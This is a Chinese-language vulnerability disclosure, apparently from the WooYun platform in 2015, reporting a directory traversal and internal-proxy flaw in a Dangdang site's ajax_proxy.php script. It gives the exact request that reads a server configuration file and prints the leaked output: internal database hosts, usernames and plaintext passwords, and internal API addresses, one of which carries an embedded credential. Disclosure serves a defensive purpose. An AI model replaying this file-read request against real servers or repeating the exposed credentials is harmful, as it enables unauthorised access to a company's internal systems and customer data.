wybug_title: 当当网某站点目录遍历可代理渗透内网
wybug_detail:
漏洞详情 披露状态：   									2015-03-25：	细节已通知厂商并且等待厂商处理中									2015-03-25：	厂商已经确认，细节仅向厂商公开									2015-04-04：	细节向核心白帽子及相关领域专家公开									2015-04-14：	细节向普通白帽子公开									2015-04-24：	细节向实习白帽子公开									2015-05-09：	细节向公众公开  简要描述： 当当网某站点目录遍历，可以读取本地文件，可以代理内网渗透,危害很大。 详细说明：  http://used.dangdang.com/ajax_proxy.php?action=research_submit&content=&email=&ques_type=3&request_url=ajax_proxy.php&sender_url=http%3A//used.dangdang.com/survey.php&type=660参数request_url限定不严，可以读取本地文件，可以代理内网渗透   漏洞证明：  

http://used.dangdang.com/ajax_proxy.php?action=research_submit&content=&email=&ques_type=3&request_url=/var/www/sh/dd_inc/conf.inc&sender_url=http%3A//used.dangdang.com/survey.php&type=660
public static $user0DataBase =  array("dbtype"=>"mysql","database"=>"user0","username"=>"reader","password"=>"n0p4ssw0rd","server"=>"myuser0db.idc2");	public static $user1DataBase =  array("dbtype"=>"mysql","database"=>"user1","username"=>"reader","password"=>"n0p4ssw0rd","server"=>"myuser1db.idc2");	public static $custDataBase =  array("dbtype"=>"dblib","database"=>"Customer","username"=>"readuser","password"=>"password","server"=>"custdb.idc3");	public static $basePrdDataBase =  array("dbtype"=>"mysql","database"=>"ProductPage","username"=>"reader","password"=>"n0p4ssw0rd","server"=>"myproddb.idc3");//原本的产品库  public static $shopDataBase =  array("dbtype"=>"mysql","database"=>"sh_shop","username"=>"sh_shop_sir","password"=>"r1sp0hshs","server"=>"c2cpdb.idc2");  public static $orderDataBase =  array("dbtype"=>"mysql","database"=>"sh_order","username"=>"sh_order_sir","password"=>"r1sr3dr0hs","server"=>"c2cpdb.idc2");  public static $questionDataBase =  array("dbtype"=>"mysql","database"=>"sh_qa","username"=>"sh_qa_sir","password"=>"r1s4qhs","server"=>"c2cpdb.idc2");  public static $accountingDataBase =  array("dbtype"=>"mysql","database"=>"sh_accounting","username"=>"sh_account_sir","password"=>"r1stnu0cc4hs","server"=>"c2cpdb.idc2");  public static $eventDataBase =  array("dbtype"=>"mysql","database"=>"sh_event","username"=>"sh_event_sir","password"=>"r1stn373hs","server"=>"c2cpdb.idc2");  public static $repos0DataBase =  array("dbtype"=>"mysql","database"=>"sh_repos0","username"=>"sh_repos0_sir","password"=>"r1s0s0p3rhs","server"=>"c2cprod0db.idc2");  public static $repos1DataBase =  array("dbtype"=>"mysql","database"=>"sh_repos1","username"=>"sh_repos1_sir","password"=>"r1s1s0p3rhs","server"=>"c2cprod1db.idc2");  public static $product0DataBase =  array("dbtype"=>"mysql","database"=>"sh_product0","username"=>"sh_product0_sir","password"=>"r1s0tcud0rphs","server"=>"c2cprod0db.idc2");  public static $product1DataBase =  array("dbtype"=>"mysql","database"=>"sh_product1","username"=>"sh_product1_sir","password"=>"r1s1tcud0rphs","server"=>"c2cprod1db.idc2");//    //工单退货列表api//    public static $OrderRefundApi =  "http://workflow.backoffice.dangdang.com/API/Query.aspx?query_type=0&%s";	//工单流水列表api	public static $OrderTransLogApi =  "http://orderapi.idc2/backoffice/ordertranslog.ashx?orderid=%s";	//工单详情api	//public static $OrderDetailsApi =  "http://orderapi.idc2/orderdetailsApi.ashx?ps=orderbtoc123&orderid=%s";
